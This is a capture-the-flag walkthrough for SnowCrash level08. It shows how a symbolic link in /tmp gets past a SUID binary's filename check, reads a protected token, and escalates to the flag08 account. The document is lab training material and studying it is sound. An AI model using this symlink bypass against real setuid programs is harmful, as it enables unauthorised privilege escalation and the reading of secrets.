# LEVEL08

## 1. Inspect The Home Directory

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

The binary `level08` is owned by `flag08`, with the SUID bit set `-rwsr-s---+`, meaning it will run with the privileges of `flag08`.
The file `token` is owned by `flag08`, with permissions `-rw-------`, so only `flag08` can read it directly.


```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

The binary expects a filename as argument.
Accessing a file named `token` fails because the program explicitly blocks any file whose name contains `token`.

## 2. Test The Binary

```bash
flag08@SnowCrash:~$ echo "test" > /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
test
```

Indeed, the binary prints the content of the file given in argument.

## 3. Bypass The Write Access Restriction

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/bypass
level08@SnowCrash:~$ ./level08 /tmp/bypass
quif5eloekouj29ke0vouxean
```
Create a symbolic link `/tmp/bypass` pointing to `~/token`.
Since the binary only blocks filename containing `token`, but not symlinks to it, we can bypass the restriction.
The program runs with `flag08`’s privileges, so it is able to follow the link and read the secret.

**Explanation:**
>- `ln TARGET LINK`	: create link from `LINK` to `TARGET`.
>- `-s`				: create a symbolic link from `LINK` to `TARGET`.

## 3. Get The Flag

```bash
> su flag08
Password: 
Don't forget to launch getflag !

> getflag
Check flag.Here is your token : XXX
```
